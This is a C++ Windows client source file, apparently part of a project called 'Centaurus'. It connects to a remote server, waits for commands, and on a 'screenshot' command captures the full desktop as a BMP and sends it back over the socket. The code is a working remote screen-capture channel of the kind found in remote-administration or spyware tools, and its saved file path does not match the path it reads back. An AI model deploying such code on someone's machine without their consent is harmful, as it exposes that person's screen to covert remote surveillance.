#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Client.h"
#include <iostream>
#include <windows.h>
#include <Lmcons.h>
#include <thread>

#include "Constants.h"

#pragma comment(lib, "ws2_32.lib")

Client::Client(const char* serverIP_, u_short port_) : m_serverIP(serverIP_), m_port(port_) {
    WSADATA wsData;
    WORD DLLVersion = MAKEWORD(2, 1);
    if (WSAStartup(DLLVersion, &wsData) != 0) {
        std::cerr << "Error initializing Winsock" << std::endl;
        exit(1);
    }

    m_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (m_socket == INVALID_SOCKET) {
        std::cerr << "Can't create a socket! Quitting" << std::endl;
        WSACleanup();
        exit(1);
    }

    SOCKADDR_IN addr;
    addr.sin_addr.s_addr = inet_addr(serverIP_);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port_);

    int connResult = connect(m_socket, (sockaddr*)&addr, sizeof(addr));
    if (connResult == SOCKET_ERROR) {
        std::cerr << "Can't connect to server! Quitting" << std::endl;
        closesocket(m_socket);
        WSACleanup();
        exit(1);
    }
}

Client::~Client() {
    closesocket(m_socket);
    WSACleanup();
}

void Client::start() {
    std::thread commandThread(&Client::listenForCommands, this);
    commandThread.join();
}

void Client::captureScreenshot(const std::string& wPath) {
    BITMAPFILEHEADER bfHeader;
    BITMAPINFOHEADER biHeader;
    BITMAPINFO bInfo;
    HGDIOBJ hTempBitmap;
    HBITMAP hBitmap;
    BITMAP bAllDesktops;
    HDC hDC, hMemDC;
    LONG lWidth, lHeight;
    BYTE *bBits = NULL;
    HANDLE hHeap = GetProcessHeap();
    DWORD cbBits, dwWritten = 0;
    HANDLE hFile;
    INT x = GetSystemMetrics(SM_XVIRTUALSCREEN);
    INT y = GetSystemMetrics(SM_YVIRTUALSCREEN);

    ZeroMemory(&bfHeader, sizeof(BITMAPFILEHEADER));
    ZeroMemory(&biHeader, sizeof(BITMAPINFOHEADER));
    ZeroMemory(&bInfo, sizeof(BITMAPINFO));
    ZeroMemory(&bAllDesktops, sizeof(BITMAP));

    hDC = GetDC(NULL);
    hTempBitmap = GetCurrentObject(hDC, OBJ_BITMAP);
    GetObjectW(hTempBitmap, sizeof(BITMAP), &bAllDesktops);

    lWidth = bAllDesktops.bmWidth;
    lHeight = bAllDesktops.bmHeight;

    DeleteObject(hTempBitmap);

    bfHeader.bfType = (WORD)('B' | ('M' << 8));
    bfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    biHeader.biSize = sizeof(BITMAPINFOHEADER);
    biHeader.biBitCount = 24;
    biHeader.biCompression = BI_RGB;
    biHeader.biPlanes = 1;
    biHeader.biWidth = lWidth;
    biHeader.biHeight = lHeight;

    bInfo.bmiHeader = biHeader;

    cbBits = (((24 * lWidth + 31)&~31) / 8) * lHeight;

    hMemDC = CreateCompatibleDC(hDC);
    hBitmap = CreateDIBSection(hDC, &bInfo, DIB_RGB_COLORS, (VOID **)&bBits, NULL, 0);
    SelectObject(hMemDC, hBitmap);
    BitBlt(hMemDC, 0, 0, lWidth, lHeight, hDC, x, y, SRCCOPY);

    
    hFile = CreateFileA(wPath.c_str(), GENERIC_WRITE | GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(INVALID_HANDLE_VALUE == hFile)
    {
        DeleteDC(hMemDC);
        ReleaseDC(NULL, hDC);
        DeleteObject(hBitmap);

        return;
    }
    WriteFile(hFile, &bfHeader, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(hFile, &biHeader, sizeof(BITMAPINFOHEADER), &dwWritten, NULL);
    WriteFile(hFile, bBits, cbBits, &dwWritten, NULL);
    FlushFileBuffers(hFile);
    CloseHandle(hFile);

    DeleteDC(hMemDC);
    ReleaseDC(NULL, hDC);
    DeleteObject(hBitmap);
}

void Client::sendScreenshot(SOCKET sock) {
    const std::string screenshotFile = "screenshot.bmp";
    captureScreenshot((Centaurus::contentPath / screenshotFile).string());

    FILE* file;
    errno_t err = fopen_s(&file, screenshotFile.c_str(), "rb");
    if (err != 0) {
        std::cerr << "Error opening file for reading" << std::endl;
        return;
    }

    char buffer[4096];
    while (!feof(file)) {
        int bytesRead = fread(buffer, 1, sizeof(buffer), file);
        if (bytesRead > 0) {
            send(sock, buffer, bytesRead, 0);
        }
    }

    fclose(file);
}

void Client::listenForCommands() {
    char buf[4096];
    while (true) {
        ZeroMemory(buf, 4096);
        int bytesReceived = recv(m_socket, buf, 4096, 0);
        if (bytesReceived > 0) {
            std::string command(buf, 0, bytesReceived);
            if (command == "screenshot") {
                std::cout << "Received screenshot command" << std::endl;
                sendScreenshot(m_socket);
            } else if (command == "exit") {
                std::cout << "Server is shutting down" << std::endl;
                break;
            }
        }
    }
}
